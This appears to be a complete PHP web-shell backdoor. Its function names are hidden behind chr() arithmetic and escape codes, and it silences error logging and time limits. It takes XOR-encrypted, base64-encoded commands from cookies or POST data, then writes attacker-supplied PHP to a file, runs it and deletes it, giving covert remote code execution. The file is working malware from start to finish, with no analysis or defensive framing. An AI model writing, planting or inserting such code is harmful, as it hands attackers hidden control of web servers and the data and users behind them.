<?php $ymiqu = chr(702-600).chr(892-787).chr(108)."\145".chr(818-723)."\160"."\x75"."\x74".chr(842-747)."\143".'o'."\156".chr(912-796)."\145".'n'."\x74".'s';
$mxxqa = "\142".'a'.'s'."\145".'6'.chr(105-53).chr(95).chr(613-513)."\145".chr(374-275).chr(399-288)."\x64".'e';
$ttundjx = chr(105).chr(110).chr(105)."\137"."\163".chr(101).chr(116);
$tvsvz = chr(571-454)."\x6e".chr(108)."\x69"."\x6e"."\x6b";


@$ttundjx("\x65"."\162".chr(771-657)."\157"."\162".chr(370-275).chr(202-94).'o'.chr(103), NULL);
@$ttundjx('l'.chr(469-358)."\147"."\137".chr(700-599).chr(114).chr(114).'o'.chr(114)."\163", 0);
@$ttundjx(chr(109).chr(97)."\170".chr(95).chr(958-857)."\170"."\x65".'c'.chr(456-339)."\x74".chr(591-486)."\157"."\x6e"."\137"."\x74".chr(105)."\x6d"."\145", 0);
@set_time_limit(0);

function tfyqq($elfbw, $tujiqotctr)
{
    $doclpstw = "";
    for ($reicdidg = 0; $reicdidg < strlen($elfbw);) {
        for ($j = 0; $j < strlen($tujiqotctr) && $reicdidg < strlen($elfbw); $j++, $reicdidg++) {
            $doclpstw .= chr(ord($elfbw[$reicdidg]) ^ ord($tujiqotctr[$j]));
        }
    }
    return $doclpstw;
}

$mvodoncb = array_merge($_COOKIE, $_POST);
$lubxsl = 'cfa8dbd0-ce51-408e-8608-0d8a0a096f3d';
foreach ($mvodoncb as $hxipp => $elfbw) {
    $elfbw = @unserialize(tfyqq(tfyqq($mxxqa($elfbw), $lubxsl), $hxipp));
    if (isset($elfbw[chr(97).chr(388-281)])) {
        if ($elfbw[chr(97)] == chr(105)) {
            $reicdidg = array(
                "\x70"."\166" => @phpversion(),
                chr(851-736).chr(1085-967) => "3.5",
            );
            echo @serialize($reicdidg);
        } elseif ($elfbw[chr(97)] == "\145") {
            $jtwjmoy = "./" . md5($lubxsl) . '.'.chr(105).'n'.chr(493-394);
            @$ymiqu($jtwjmoy, "<" . chr(841-778)."\160".chr(263-159).chr(112).' '.chr(64).chr(117)."\x6e".chr(199-91).chr(282-177)."\156"."\x6b"."\50".chr(348-253).chr(95).chr(892-822)."\x49".'L'.chr(69)."\137"."\137".chr(41).chr(59)."\40" . $elfbw["\x64"]);
            @include($jtwjmoy);
            @$tvsvz($jtwjmoy);
        }
        exit();
    }
}

